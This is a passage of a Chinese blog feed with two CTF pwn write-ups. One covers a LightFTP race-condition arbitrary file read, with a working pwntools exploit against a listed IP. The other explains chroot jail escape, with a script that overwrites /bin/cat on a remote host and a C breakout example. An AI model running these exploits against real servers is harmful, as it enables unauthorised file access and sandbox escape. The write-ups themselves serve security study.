class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">ftp_client_thread</span><span class="params">(SOCKET *s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">···</span><br><span class="line"><span class="comment">//读入命令</span></span><br><span class="line"><span class="keyword">if</span> (!recvcmd(&amp;ctx, rcvbuf, <span class="keyword">sizeof</span>(rcvbuf)))</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">  ···</span><br><span class="line">  <span class="comment">//执行对应的命令</span></span><br><span class="line">  <span class="keyword">for</span> (c = <span class="number">0</span>; c &lt; MAX_CMDS; c++)</span><br><span class="line">                <span class="keyword">if</span> (strncasecmp(cmd, ftpprocs[c].Name, cmdlen) == <span class="number">0</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    cmdno = c;</span><br><span class="line">                    rv = ftpprocs[c].Proc(&amp;ctx, params);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中<code>ftpprocs</code>是一个由命令名和对应的函数组成的结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> FTPROUTINE_ENTRY ftpprocs[MAX_CMDS] = &#123;</span><br><span class="line">    &#123;<span class="string">"USER"</span>, ftpUSER&#125;, &#123;<span class="string">"QUIT"</span>, ftpQUIT&#125;, &#123;<span class="string">"NOOP"</span>, ftpNOOP&#125;, &#123;<span class="string">"PWD"</span>, ftpPWD&#125;, &#123;<span class="string">"TYPE"</span>, ftpTYPE&#125;, &#123;<span class="string">"PORT"</span>, ftpPORT&#125;, &#123;<span class="string">"LIST"</span>, ftpLIST&#125;, &#123;<span class="string">"CDUP"</span>, ftpCDUP&#125;, &#123;<span class="string">"CWD"</span>, ftpCWD&#125;, &#123;<span class="string">"RETR"</span>, ftpRETR&#125;, &#123;<span class="string">"ABOR"</span>, ftpABOR&#125;, &#123;<span class="string">"DELE"</span>, ftpDELE&#125;, &#123;<span class="string">"PASV"</span>, ftpPASV&#125;, &#123;<span class="string">"PASS"</span>, ftpPASS&#125;, &#123;<span class="string">"REST"</span>, ftpREST&#125;, &#123;<span class="string">"SIZE"</span>, ftpSIZE&#125;, &#123;<span class="string">"MKD"</span>, ftpMKD&#125;, &#123;<span class="string">"RMD"</span>, ftpRMD&#125;, &#123;<span class="string">"STOR"</span>, ftpSTOR&#125;, &#123;<span class="string">"SYST"</span>, ftpSYST&#125;, &#123;<span class="string">"FEAT"</span>, ftpFEAT&#125;, &#123;<span class="string">"APPE"</span>, ftpAPPE&#125;, &#123;<span class="string">"RNFR"</span>, ftpRNFR&#125;, &#123;<span class="string">"RNTO"</span>, ftpRNTO&#125;, &#123;<span class="string">"OPTS"</span>, ftpOPTS&#125;, &#123;<span class="string">"MLSD"</span>, ftpMLSD&#125;, &#123;<span class="string">"AUTH"</span>, ftpAUTH&#125;, &#123;<span class="string">"PBSZ"</span>, ftpPBSZ&#125;, &#123;<span class="string">"PROT"</span>, ftpPROT&#125;, &#123;<span class="string">"EPSV"</span>, ftpEPSV&#125;, &#123;<span class="string">"HELP"</span>, ftpHELP&#125;, &#123;<span class="string">"SITE"</span>, ftpSITE&#125;&#125;;</span><br></pre></td></tr></table></figure><h2 id="0x03-漏洞挖掘思路"><a href="#0x03-漏洞挖掘思路" class="headerlink" title="0x03 漏洞挖掘思路"></a>0x03 漏洞挖掘思路</h2><p>这种协议的漏洞无非会出现在两种地方</p><ol><li>命令的解析部分</li><li>命令的执行部分</li></ol><p>然后使用checksec分析一下程序的保护机制</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br><span class="line">FORTIFY:  Enabled</span><br></pre></td></tr></table></figure><p>发现程序保护全开，那么内存洞的利用可能就很小了，大概率是逻辑问题这种。</p><p>那么首先考虑目录穿越，但是发现读文件的时候目录穿越已经被检测到了，做过一些尝试后都不行，因此思路pass。</p><p>接着看其他的一些指令功能有没有缺陷可以导致跨目录读这种。此时注意到ftpList函数，该函数功能为查看当前文件夹下的文件列表。读取的操作使用<code>list_thread</code>去执行。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ftpLIST</span><span class="params">(PFTPCONTEXT context, <span class="keyword">const</span> <span class="keyword">char</span> *params)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">//构造我们要查看的文件目录</span></span><br><span class="line">  ftp_effective_path(context-&gt;RootDir, context-&gt;CurrentDir, params, <span class="keyword">sizeof</span>(context-&gt;FileName), context-&gt;FileName);</span><br><span class="line">···</span><br><span class="line">   context-&gt;WorkerThreadValid = pthread_create(&amp;tid, <span class="literal">NULL</span>, (<span class="keyword">void</span> *(*)(<span class="keyword">void</span> *))list_thread, context);</span><br><span class="line">  ···</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中<code>CurrentDIr</code>是我们当前所在的文件夹，<code>RootDir</code>是我们的工作目录，<code>FileName</code>是将前两者拼接后得到的我们要读取的真实目录。但注意到线程里用到了context这个结构，但并没有对这个变量做任何保护。</p><p>又注意到<code>ftpUser</code>函数中将输入直接拷贝到了这个<code>context-&gt;FileName</code>中。因此我们可以通过条件竞争控制FileName达到任意文件读的目的。        </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ftpUSER</span><span class="params">(PFTPCONTEXT context, <span class="keyword">const</span> <span class="keyword">char</span> *params)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ···</span><br><span class="line">    <span class="built_in">strcpy</span>(context-&gt;FileName, params);</span><br><span class="line">  ···</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x04-漏洞利用流程"><a href="#0x04-漏洞利用流程" class="headerlink" title="0x04 漏洞利用流程"></a>0x04 漏洞利用流程</h2><ol><li>执行FtpList（此时会等待客户端再建立一个新的连接，将List后的结果通过这个连接发送）</li><li>使用FtpUser改掉context-&gt;FileName</li><li>建立新连接，读取根目录下文件列表</li><li>获取flag文件名后再重复如上操作进行任意文件读</li></ol><h2 id="0x05-exp"><a href="#0x05-exp" class="headerlink" title="0x05 exp"></a>0x05 exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">from pwn import * </span><br><span class="line">import re </span><br><span class="line">port_pattern = r&apos;\(0,0,0,0,(\d*),(\d*)\)&apos;</span><br><span class="line"></span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line"># sh = remote(&apos;localhost&apos;, 2121)</span><br><span class="line">sh = remote(&apos;47.89.253.219&apos;, 2121)</span><br><span class="line"></span><br><span class="line">sh.send(b&apos;USER anonymous\r\n&apos;)</span><br><span class="line">sh.send(b&apos;PASS a\r\n&apos;)</span><br><span class="line">sh.recvuntil(b&apos;230 User logged in, proceed.\r\n&apos;)</span><br><span class="line">sh.send(b&apos;PASV \r\n&apos;)</span><br><span class="line">sh.recvuntil(b&apos;227 Entering Passive Mode &apos;)</span><br><span class="line">port_text = sh.recvuntil(&apos;.\r\n&apos;, drop=True)</span><br><span class="line">port_result = re.findall(port_pattern, port_text.decode())[0]</span><br><span class="line">port = int(port_result[0]) &lt;&lt; 8 | int(port_result[1])</span><br><span class="line"># print(port)</span><br><span class="line"># pause()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.send(b&apos;LIST \r\n&apos;)</span><br><span class="line">sh.send(b&apos;USER /\r\n&apos;)</span><br><span class="line">recv_socket = remote(&apos;47.89.253.219&apos;, port)</span><br><span class="line"></span><br><span class="line">sleep(1)</span><br><span class="line">ls_result = recv_socket.recv()</span><br><span class="line">flag_pattern = r&apos;flag.[0-9a-f\-]*&apos;</span><br><span class="line">flag = re.findall(flag_pattern, ls_result.decode())[0]</span><br><span class="line"></span><br><span class="line">sh.send(b&apos;USER anonymous\r\n&apos;)</span><br><span class="line">sh.send(b&apos;PASS a\r\n&apos;)</span><br><span class="line">sh.recvuntil(b&apos;230 User logged in, proceed.\r\n&apos;)</span><br><span class="line">sh.send(b&apos;RETR hello.txt\r\n&apos;)</span><br><span class="line">sh.send((&apos;USER /&#123;&#125;&apos;.format(flag)).encode(&apos;utf-8&apos;))</span><br><span class="line"></span><br><span class="line">sleep(1)</span><br><span class="line">flag_result = recv_socket.recv()</span><br><span class="line">print(flag_result)</span><br><span class="line"></span><br><span class="line"># sh.send(b&apos;MLSD flag.6d7be582-8e4a-11ed-9acb-0242ac110002\r\n&apos;)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-在一切之前&quot;&gt;&lt;a href=&quot;#0x00-在一切之前&quot; class=&quot;headerlink&quot; title=&quot;0x00 在一切之前&quot;&gt;&lt;/a&gt;0x00 在一切之前&lt;/h2&gt;&lt;p&gt;审计lightftp代码中出现0day漏洞。&lt;/p&gt;
    
    </summary>
    
      <category term="pwn题writeup" scheme="wood1314.github.io/categories/pwn%E9%A2%98writeup/"/>
    
    
      <category term="writeup" scheme="wood1314.github.io/tags/writeup/"/>
    
  </entry>
  
  <entry>
    <title>chroot jailbreak</title>
    <link href="wood1314.github.io/year/08/29/clgvp3n5r00296n3fkcpj0frm/"/>
    <id>wood1314.github.io/year/08/29/clgvp3n5r00296n3fkcpj0frm/</id>
    <published>2022-08-29T09:18:36.000Z</published>
    <updated>2022-09-01T06:51:01.320Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>最近网鼎杯青龙组做到了一道chroot逃逸的题目，正好整理一下它逃逸的原理。</p><a id="more"></a><h2 id="0x01-逃逸利用"><a href="#0x01-逃逸利用" class="headerlink" title="0x01 逃逸利用"></a>0x01 逃逸利用</h2><p>通常来说，chroot一般有两个含义，chroot(1)是/usr/bin/chroot, chroot(2)是glibc中的一个函数。</p><blockquote><p>chroot(1)<br>chroot - run command or interactive shell with special root directory<br>chroot [OPTION] NEWROOT [COMMAND [ARG]…]</p></blockquote><blockquote><p>chroot(2)<br>chroot - change root directory<br>int chroot(const char *path);</p></blockquote><p>chroot主要的功能是改变根目录，之前是在ctf出题时会将/home/ctf目录chroot成为根目录，实现与我们docker的文件系统隔离，提供一个安全的靶场环境。在模拟运行固件的时候，也经常会将当前文件系统的目录chroot为根目录，这样才能找到固件所需库的路径。</p><p>但chroot是一个不安全的feature，容易被逃逸出来，这里有一个逃逸用的[工具](<a href="https://github.com/earthquake/chw00t" target="_blank" rel="noopener">earthquake/chw00t: chw00t - Unices chroot breaking tool (github.com)</a>)</p><p>里面也包含了一些逃逸常用的方法</p><h3 id="网鼎杯青龙组exp"><a href="#网鼎杯青龙组exp" class="headerlink" title="网鼎杯青龙组exp"></a>网鼎杯青龙组exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">import</span> os </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'./chw00t'</span>, <span class="string">'rb'</span>) <span class="keyword">as</span> fd:</span><br><span class="line">    binary = fd.read() </span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> binary:</span><br><span class="line">    payload += <span class="string">'\\x'</span> + hex(i)[<span class="number">2</span>:].rjust(<span class="number">2</span>, <span class="string">'0'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># os.system('echo -e "' + payload + '"' + '&gt; ./exp')</span></span><br><span class="line"><span class="comment"># flag = False </span></span><br><span class="line"></span><br><span class="line">first_command = <span class="string">'echo -ne "&#123;&#125;" &gt; /bin/cat'</span></span><br><span class="line">after_command = <span class="string">'echo -ne "&#123;&#125;" &gt;&gt; /bin/cat'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span><span class="params">(payload, command)</span>:</span></span><br><span class="line">    sh = remote(<span class="string">'123.57.26.28'</span>, <span class="number">31379</span>)</span><br><span class="line"></span><br><span class="line">    sh.sendlineafter(<span class="string">'get the shell, and then?'</span>, command.format(payload))</span><br><span class="line">    <span class="comment"># sleep(0.5)</span></span><br><span class="line">    sh.close() </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">size = len(payload)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, size, <span class="number">0x1000</span>):</span><br><span class="line">    data = payload[i:i+<span class="number">0x1000</span>]</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">        write(data, first_command)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        write(data, after_command)</span><br></pre></td></tr></table></figure><h2 id="0x02-chroot实现"><a href="#0x02-chroot实现" class="headerlink" title="0x02 chroot实现"></a>0x02 chroot实现</h2><h3 id="keys-chroot源码"><a href="#keys-chroot源码" class="headerlink" title="keys_chroot源码"></a>keys_chroot源码</h3><p>via: <a href="https://elixir.bootlin.com/linux/v5.6/source/fs/open.c#L506" target="_blank" rel="noopener">https://elixir.bootlin.com/linux/v5.6/source/fs/open.c#L506</a></p><p>chroot运行在内核，会调用系统函数ksys_chroot函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ksys_chroot</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> __user *filename)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">path</span> <span class="title">path</span>;</span></span><br><span class="line"><span class="keyword">int</span> error;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> lookup_flags = LOOKUP_FOLLOW | LOOKUP_DIRECTORY;</span><br><span class="line">retry:</span><br><span class="line">    <span class="comment">// 根据文件名找到 path 结构</span></span><br><span class="line">error = user_path_at(AT_FDCWD, filename, lookup_flags, &amp;path);</span><br><span class="line"><span class="keyword">if</span> (error)</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 解析 path 的 mm_root dentry 结构，再解析相应的 inode 结构，即 d_inode，就可找到挂载点相应的 inode 结构</span></span><br><span class="line">error = inode_permission(path.dentry-&gt;d_inode, MAY_EXEC | MAY_CHDIR);</span><br><span class="line"><span class="keyword">if</span> (error)</span><br><span class="line"><span class="keyword">goto</span> dput_and_out;</span><br><span class="line"></span><br><span class="line">error = -EPERM;</span><br><span class="line">    <span class="comment">// 判断当前进程所有者是不是有执行 chroot 操作的权限</span></span><br><span class="line">    <span class="comment">// 这里是 namespace, cred 的内容了，不展开</span></span><br><span class="line"><span class="keyword">if</span> (!ns_capable(current_user_ns(), CAP_SYS_CHROOT))</span><br><span class="line"><span class="keyword">goto</span> dput_and_out;</span><br><span class="line">error = security_path_chroot(&amp;path);</span><br><span class="line"><span class="keyword">if</span> (error)</span><br><span class="line"><span class="keyword">goto</span> dput_and_out;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 主要操作就是这个函数</span></span><br><span class="line">set_fs_root(current-&gt;fs, &amp;path);</span><br><span class="line">error = <span class="number">0</span>;</span><br><span class="line">dput_and_out:</span><br><span class="line">path_put(&amp;path);</span><br><span class="line"><span class="keyword">if</span> (retry_estale(error, lookup_flags)) &#123;</span><br><span class="line">lookup_flags |= LOOKUP_REVAL;</span><br><span class="line"><span class="keyword">goto</span> retry;</span><br><span class="line">&#125;</span><br><span class="line">out:</span><br><span class="line"><span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="set-fs-root"><a href="#set-fs-root" class="headerlink" title="set_fs_root"></a>set_fs_root</h3><p>主要函数，就是在这个函数里修改了程序的 “根目录”</p><p>via: <a href="https://elixir.bootlin.com/linux/v5.6/source/fs/fs_struct.c#L15" target="_blank" rel="noopener">https://elixir.bootlin.com/linux/v5.6/source/fs/fs_struct.c#L15</a></p><p>先来看一下 fs_struct</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fs_struct</span> &#123;</span></span><br><span class="line"><span class="keyword">int</span> users;</span><br><span class="line"><span class="keyword">spinlock_t</span> lock;</span><br><span class="line"><span class="keyword">seqcount_t</span> seq;</span><br><span class="line"><span class="keyword">int</span> umask;</span><br><span class="line"><span class="keyword">int</span> in_exec;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">path</span> <span class="title">root</span>, <span class="title">pwd</span>;</span> </span><br><span class="line">    <span class="comment">// root：根目录的目录项</span></span><br><span class="line"> <span class="comment">// pwd：当前工作目录的目录项</span></span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Replace the fs-&gt;&#123;rootmnt,root&#125; with &#123;mnt,dentry&#125;. Put the old values.</span></span><br><span class="line"><span class="comment"> * It can block.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_fs_root</span><span class="params">(struct fs_struct *fs, <span class="keyword">const</span> struct path *path)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">path</span> <span class="title">old_root</span>;</span></span><br><span class="line"></span><br><span class="line">path_get(path);</span><br><span class="line">spin_lock(&amp;fs-&gt;lock); <span class="comment">// 自旋锁</span></span><br><span class="line">write_seqcount_begin(&amp;fs-&gt;seq);</span><br><span class="line">old_root = fs-&gt;root; <span class="comment">// 保存程序的 根目录 的目录项</span></span><br><span class="line">fs-&gt;root = *path; <span class="comment">// 设置 根目录 为 path 的目录项</span></span><br><span class="line">write_seqcount_end(&amp;fs-&gt;seq);</span><br><span class="line">spin_unlock(&amp;fs-&gt;lock);</span><br><span class="line"><span class="keyword">if</span> (old_root.dentry)</span><br><span class="line">path_put(&amp;old_root);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="struct-path"><a href="#struct-path" class="headerlink" title="struct path"></a>struct path</h3><p>via: <a href="https://elixir.bootlin.com/linux/v5.6/source/include/linux/path.h#L8" target="_blank" rel="noopener">https://elixir.bootlin.com/linux/v5.6/source/include/linux/path.h#L8</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">path</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">vfsmount</span> *<span class="title">mnt</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dentry</span> *<span class="title">dentry</span>;</span></span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure><h3 id="struct-vfsmount"><a href="#struct-vfsmount" class="headerlink" title="struct vfsmount"></a>struct vfsmount</h3><p>描述独立文件系统的挂载信息，每个不同的挂载点对应一个独立的 <code>vfsmount</code> 结构，属于同一文件系统的所有目录和文件隶属同一 <code>vfsmount</code> 该 <code>vfsmount</code> 结构对应于该文件系统顶层目录，即挂载目录</p><p>via: <a href="https://elixir.bootlin.com/linux/v5.6/source/include/linux/mount.h#L68" target="_blank" rel="noopener">https://elixir.bootlin.com/linux/v5.6/source/include/linux/mount.h#L68</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">vfsmount</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dentry</span> *<span class="title">mnt_root</span>;</span><span class="comment">/* 上一层挂载点对应的 dentry */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">super_block</span> *<span class="title">mnt_sb</span>;</span><span class="comment">/* 指向超级块 */</span></span><br><span class="line"><span class="keyword">int</span> mnt_flags;</span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure><p>### </p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>其实 chroot 修改了进程的 root 目录的核心操作就是修改了 进程 的 <code>task_struct -&gt; fs -&gt; root</code></p><p>通过文件名去解析 文件夹 对应的<code>path</code>    结构，存在<code>patch</code>    变量里面，然后权限检查，再然后把<code>path</code>    传进<code>set_fs_root</code>    函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fs-&gt;root = *path;</span><br></pre></td></tr></table></figure><p>修改了root，这样进程就认为 <code>filename</code> 是根目录，因为 <code>fs-&gt;root</code> 存的是 <code>filename</code> 目录的 <code>path</code> 结构</p><p>但我们可以发现，它只改变了<code>root</code>，但是没有改变<code>cwd</code></p><h2 id="chroot-jailbreak-原理分析"><a href="#chroot-jailbreak-原理分析" class="headerlink" title="chroot jailbreak 原理分析"></a>chroot jailbreak 原理分析</h2><p>根据上文源码可以发现，我们只改变了<code>root</code>，但是没有改变<code>cwd</code></p><ul><li><code>chroot()</code>不改变工作目录。因此通常在调用<code>chroot()</code>之后会紧跟<code>chdir(&quot;/&quot;)</code>，把工作目录设定到新的root；否则仍可使用工作目录访问jail外的文件。只是之后访问jail外的文件不可以用绝对路径了，因为root目录还在jail里。</li><li>可以使用jail外文件的文件描述符脱离jail，使用<code>fchdir()</code>即可改变工作目录到jail外。如果是特权进程的话(精确地，指拥有<code>CAP_SYS_CHROOT</code>权限)，还可以在<code>fchdir()</code>后使用<code>chroot(&quot;.&quot;)</code>以把root目录设置到jail外。倘若多<code>chdir(&quot;..&quot;)</code>几次，可以回到原先的root目录。</li><li>Unix domain socket提供了进程间传递文件描述符的方法。限定在chroot jail内的进程可以从外部获取文件描述符，之后即可<code>fchdir()</code>使工作目录脱离jail。</li></ul><p>下面是一个例子</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> fd = open(<span class="string">"."</span>, O_RDONLY), i; <span class="comment">// jail外的文件描述符，供之后脱离</span></span><br><span class="line">  mkdir(<span class="string">"tempdir"</span>, <span class="number">0755</span>);</span><br><span class="line">  <span class="keyword">if</span> (fd == <span class="number">-1</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> (chroot(<span class="string">"tempdir"</span>) == <span class="number">-1</span>) <span class="keyword">return</span> <span class="number">1</span>; <span class="comment">// chroot</span></span><br><span class="line">  <span class="keyword">if</span> (fchdir(fd) == <span class="number">-1</span>) <span class="keyword">return</span> <span class="number">1</span>; <span class="comment">// 脱离</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">1024</span>; i++) <span class="comment">// 回到原先的root目录。这里不能使用绝对路径`/`，只能逐步上移</span></span><br><span class="line">      chdir(<span class="string">".."</span>);</span><br><span class="line">  <span class="keyword">if</span> (chroot(<span class="string">"."</span>) == <span class="number">-1</span>) <span class="keyword">return</span> <span class="number">1</span>; <span class="comment">// 若是特权进程，则可进一步，把root设回去；不是的话也足以访问jail外的文件</span></span><br><span class="line">  system(<span class="string">"ls"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x03-参考"><a href="#0x03-参考" class="headerlink" title="0x03 参考"></a>0x03 参考</h2><p><a href="https://xuanxuanblingbling.github.io/ctf/pwn/2019/10/15/sandbox/" target="_blank" rel="noopener">清华校赛THUCTF2019 之 固若金汤 | Clang裁缝店 (xuanxuanblingbling.github.io)</a></p><p><a href="https://atum.li/2017/04/25/linuxsandbox/#chroot-jail" 